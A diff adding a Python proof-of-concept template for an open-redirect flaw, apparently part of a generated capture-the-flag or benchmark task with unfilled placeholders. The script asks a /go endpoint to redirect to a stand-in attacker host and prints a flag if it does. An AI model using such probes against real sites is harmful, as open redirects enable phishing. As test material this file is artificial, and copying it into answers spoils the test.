@@ -1,0 +1,38 @@
+# Asset-backed family-aware fallback template for Open Redirect.
+import argparse
+import sys
+
+import requests
+
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+DEFAULT_TARGET = 'https://evil.example/landing'
+
+
+def exploit(base_url: str, target: str) -> bool:
+    url = base_url.rstrip('/') + '/go'
+    try:
+        resp = requests.get(url, params={'next': target}, timeout=5, allow_redirects=False)
+    except requests.RequestException as exc:
+        print(f'[open-redirect-fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    location = resp.headers.get('Location', '')
+    return resp.status_code in {301, 302, 303, 307, 308} and location == target
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Open Redirect fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_TARGET)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[open-redirect-fallback] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+
+if __name__ == '__main__':
+    main()
